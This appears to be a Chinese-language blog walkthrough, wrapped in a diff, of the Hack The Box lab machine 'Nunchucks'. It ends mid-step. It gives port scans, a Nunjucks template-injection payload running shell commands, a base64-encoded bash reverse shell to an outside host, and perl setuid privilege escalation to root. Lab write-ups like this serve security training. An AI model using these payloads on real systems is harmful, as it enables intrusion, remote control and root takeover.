@@ -1,0 +1,722 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="World&#39;sEnd">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Recon:Masscan:123456&gt;&gt; sudo masscan -p1-65535,U:1-65535 10.10.11.122 --rate 2000 -e tun0Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly&#x2F;14GZzcT) at 2022-05-15 05:12:50 GMTInitiating SYN Stealth ScanScanni">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Walkthrough - Nunchucks">
+<meta property="og:url" content="https://crazyinside.github.io/post/HackTheBox-Nunchucks.html">
+<meta property="og:site_name" content="Network Security Notes">
+<meta property="og:description" content="Recon:Masscan:123456&gt;&gt; sudo masscan -p1-65535,U:1-65535 10.10.11.122 --rate 2000 -e tun0Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly&#x2F;14GZzcT) at 2022-05-15 05:12:50 GMTInitiating SYN Stealth ScanScanni">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515131733818.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515132405611.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515132057143.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515132718905.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515132757847.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515132932366.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515133139761.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515133318066.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515135516895.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515135631811.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515135913013.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515140130904.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515140219138.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515140928466.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515141055256.png">
+<meta property="article:published_time" content="2023-08-13T22:39:09.022Z">
+<meta property="article:modified_time" content="2023-08-11T15:52:06.032Z">
+<meta property="article:author" content="World&#39;sEnd">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515131733818.png">
+  
+  
+  
+  <title>HTB Walkthrough - Nunchucks - Network Security Notes</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/wallhaven-x6dj5z_3840x2160.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTB Walkthrough - Nunchucks"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-14 06:39" pubdate>
+          August 14, 2023 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.4k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          53 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HTB Walkthrough - Nunchucks</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><h5 id="Masscan"><a href="#Masscan" class="headerlink" title="Masscan:"></a>Masscan:</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; sudo masscan -p1-65535,U:1-65535 10.10.11.122 --rate 2000 -e tun0</span><br><span class="line">Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-05-15 05:12:50 GMT</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [131070 ports/host]</span><br><span class="line">Discovered open port 80/tcp on 10.10.11.122                                    </span><br><span class="line">Discovered open port 443/tcp on 10.10.11.122 </span><br></pre></td></tr></table></figure>
+
+<h5 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap:"></a>Nmap:</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-15 13:15 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.122</span><br><span class="line">Host is up (0.19s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">80/tcp  open  http     nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to https://nunchucks.htb/</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)</span><br><span class="line">| tls-nextprotoneg: </span><br><span class="line">|_  http/1.1</span><br><span class="line">|_http-title: Nunchucks - Landing Page</span><br><span class="line">| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK</span><br><span class="line">| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb</span><br><span class="line">| Not valid before: 2021-08-30T15:42:24</span><br><span class="line">|_Not valid after:  2031-08-28T15:42:24</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 34.75 seconds</span><br></pre></td></tr></table></figure>
+
+<p>80端口做了重定向：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515131733818.png" srcset="/img/loading.gif" lazyload alt="image-20220515131733818"  />
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; whatweb https://nunchucks.htb/                                 </span><br><span class="line">https://nunchucks.htb/ [200 OK] Bootstrap, Cookies[_csrf], Country[RESERVED][ZZ], Email[support@nunchucks.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.122], JQuery, Script, Title[Nunchucks - Landing Page], X-Powered-By[Express], nginx[1.18.0]</span><br></pre></td></tr></table></figure>
+
+<p>一个网上店铺应用程序：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515132405611.png" srcset="/img/loading.gif" lazyload alt="image-20220515132405611"  />
+
+<p>尽管按钮很多，但是需要我先注册：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515132057143.png" srcset="/img/loading.gif" lazyload alt="image-20220515132057143"  />
+
+<p>如果需要枚举用户名的话，这里应该会是个好地方。好吧，注册已关闭：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515132718905.png" srcset="/img/loading.gif" lazyload alt="image-20220515132718905"  />
+
+<p>登录也被禁止了：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515132757847.png" srcset="/img/loading.gif" lazyload alt="image-20220515132757847"  />
+
+<p>还是后端检测：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515132932366.png" srcset="/img/loading.gif" lazyload alt="image-20220515132932366"  />
+
+<p>注册页面也是后端检验：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515133139761.png" srcset="/img/loading.gif" lazyload alt="image-20220515133139761"  />
+
+<p>或许我可以破坏掉json数据看后端会不会对其进行校验，确实如此：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515133318066.png" srcset="/img/loading.gif" lazyload alt="image-20220515133318066"  />
+
+<p>我得到了绝对路径，但暂时不知道用来做什么，尝试收集目录信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[13:36:34] Starting: </span><br><span class="line">[13:37:19] 301 -  179B  - /assets  -&gt;  /assets/</span><br><span class="line">[13:37:43] 200 -    9KB - /login</span><br><span class="line">[13:37:43] 200 -    9KB - /login/</span><br><span class="line">[13:37:56] 200 -   19KB - /privacy</span><br><span class="line">[13:38:00] 400 -    1KB - /servlet/%C0%AE%C0%AE%C0%AF</span><br><span class="line">[13:38:02] 200 -    9KB - /signup</span><br><span class="line">[13:38:06] 200 -   17KB - /terms</span><br></pre></td></tr></table></figure>
+
+<p>像是个目录遍历，不过想多了，没什么薄弱点啊，或许我可以尝试扫一遍子域名 ，–hh过滤30587，要不会被无效信息刷屏：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">000000035:   200        546 L    2271 W     30587 Ch    <span class="string">&quot;cp&quot;</span>                                                 </span><br><span class="line">000000032:   200        546 L    2271 W     30587 Ch    <span class="string">&quot;mysql&quot;</span>                                              </span><br><span class="line">000000034:   200        546 L    2271 W     30587 Ch    <span class="string">&quot;support&quot;</span>                                            </span><br><span class="line">000000051:   200        546 L    2271 W     30587 Ch    <span class="string">&quot;api&quot;</span>                                                </span><br><span class="line">000000053:   200        546 L    2271 W     30587 Ch    <span class="string">&quot;images&quot;</span>                                             </span><br><span class="line">000000057:   200        546 L    2271 W     30587 Ch    <span class="string">&quot;sql&quot;</span>                                                </span><br><span class="line">000000065:   200        546 L    2271 W     30587 Ch    <span class="string">&quot;mx1&quot;</span>                                                </span><br><span class="line">000000081:   200        101 L    259 W      4028 Ch     <span class="string">&quot;store&quot;</span>                                              </span><br><span class="line">^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...</span><br><span class="line"></span><br><span class="line">Total time: 4.781369</span><br><span class="line">Processed Requests: 55</span><br><span class="line">Filtered Requests: 0</span><br><span class="line">Requests/sec.: 11.50298</span><br><span class="line"></span><br><span class="line">                                                                                                                      </span><br><span class="line">&gt;&gt; wfuzz -H <span class="string">&quot;Host: FUZZ.nunchucks.htb&quot;</span> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 30587 https://nunchucks.htb </span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="string">&#x27;s documentation for more information.</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Target: https://nunchucks.htb/</span></span><br><span class="line"><span class="string">Total requests: 4989</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string">ID           Response   Lines    Word       Chars       Payload                                              </span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">000000081:   200        101 L    259 W      4028 Ch     &quot;store&quot; </span></span><br></pre></td></tr></table></figure>
+
+<p>可以捕获到另一个子域名：store.nunchucks.htb.</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515135516895.png" srcset="/img/loading.gif" lazyload alt="image-20220515135516895"  />
+
+<p>都是假按钮，除了邮箱：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515135631811.png" srcset="/img/loading.gif" lazyload alt="image-20220515135631811"  />
+
+<p>有输入有回显，我尝试了模板注入，确实是这样：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515135913013.png" srcset="/img/loading.gif" lazyload alt="image-20220515135913013"  />
+
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515140130904.png" srcset="/img/loading.gif" lazyload alt="image-20220515140130904"  />
+
+<p>这就要搜了，Express框架会使用什么引擎：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515140219138.png" srcset="/img/loading.gif" lazyload alt="image-20220515140219138"  />
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#123;&#123;range.constructor(\&quot;return global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;tail /etc/passwd&#x27;)\&quot;)()&#125;&#125;@htb.com</span><br></pre></td></tr></table></figure>
+
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515140928466.png" srcset="/img/loading.gif" lazyload alt="image-20220515140928466"  />
+
+<p>当前用户admindavid：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515141055256.png" srcset="/img/loading.gif" lazyload alt="image-20220515141055256"  />
+
+<p>可以尝试反弹shell，直接输入命令会出错，需要进行编码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; <span class="built_in">echo</span> <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.5/9001 0&gt;&amp;1&#x27;</span> | <span class="built_in">base64</span></span><br><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41LzkwMDEgMD4mMQo=</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/submit</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>store.nunchucks.htb</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>_csrf=m1BsKNRC2A1TPi8qnMCZ9cH9</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://store.nunchucks.htb/</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://store.nunchucks.htb</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>162</span><br><span class="line"><span class="attribute">Dnt</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Te</span><span class="punctuation">: </span>trailers</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-autoit">&#123;<span class="string">&quot;email&quot;</span>:<span class="string">&quot;admin&#123;&#123;range.constructor(\&quot;</span><span class="keyword">return</span> <span class="keyword">global</span>.process.mainModule.require(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41LzkwMDEgMD4mMQo=|base64 -d|bash&#x27;</span>)\<span class="string">&quot;)()&#125;&#125;@htb.com&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; nc -lvnp 9001</span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">connect to [10.10.16.5] from (UNKNOWN) [10.10.11.122] 38086</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (1009): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">david@nunchucks:/var/www/store.nunchucks$ <span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">david@nunchucks:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line">david@nunchucks:~$ <span class="built_in">cat</span> user.txt	</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">9387541bc650fb976956afbc2506e8ca</span><br></pre></td></tr></table></figure>
+
+<p>sudo -l 需要密码，而我没有：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">david@nunchucks:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> david: </span><br><span class="line">Sorry, try again.</span><br><span class="line">[sudo] password <span class="keyword">for</span> david: </span><br><span class="line">Sorry, try again.</span><br><span class="line">[sudo] password <span class="keyword">for</span> david: </span><br><span class="line">sudo: 3 incorrect password attempts</span><br><span class="line">david@nunchucks:~$ </span><br></pre></td></tr></table></figure>
+
+<p>有个备份脚本，但是需要root去执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">david@nunchucks:/opt$ <span class="built_in">ls</span></span><br><span class="line">backup.pl  web_backups</span><br><span class="line">david@nunchucks:/opt$ <span class="built_in">which</span> pl</span><br><span class="line">david@nunchucks:/opt$ <span class="built_in">which</span> perl</span><br><span class="line">/usr/bin/perl</span><br><span class="line">david@nunchucks:/opt$ <span class="built_in">getcap</span> /usr/bin/perl</span><br><span class="line">/usr/bin/perl = cap_setuid+ep</span><br><span class="line">david@nunchucks:/opt$</span><br></pre></td></tr></table></figure>
+
+<p>perl有SUID：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">david@nunchucks:/opt$ /usr/bin/perl -e <span class="string">&#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;cat /root/root.txt&quot;;&#x27;</span></span><br><span class="line"><span class="built_in">cat</span>: /root/root.txt: Permission denied</span><br><span class="line">david@nunchucks:/opt$ /usr/bin/perl -e <span class="string">&#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;id&quot;;&#x27;</span></span><br><span class="line">uid=0(root) gid=1000(david) <span class="built_in">groups</span>=1000(david)</span><br><span class="line">david@nunchucks:/opt$ /usr/bin/perl -e <span class="string">&#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;whoami&quot;;&#x27;</span></span><br><span class="line">root</span><br><span class="line">david@nunchucks:/opt$ <span class="built_in">cd</span> /tmp/</span><br><span class="line">david@nunchucks:/tmp$ <span class="built_in">touch</span> a.pl</span><br><span class="line">david@nunchucks:/tmp$ <span class="built_in">cat</span> a.pl </span><br><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line">use POSIX qw(strftime);</span><br><span class="line">use POSIX qw(setuid);</span><br><span class="line">POSIX::setuid(0);</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">david@nunchucks:/tmp$ /usr/bin/perl ./a.pl </span><br><span class="line">Can<span class="string">&#x27;t open perl script &quot;./a.pl&quot;: Permission denied</span></span><br><span class="line"><span class="string">david@nunchucks:/tmp$ chmod +x ./a.pl</span></span><br><span 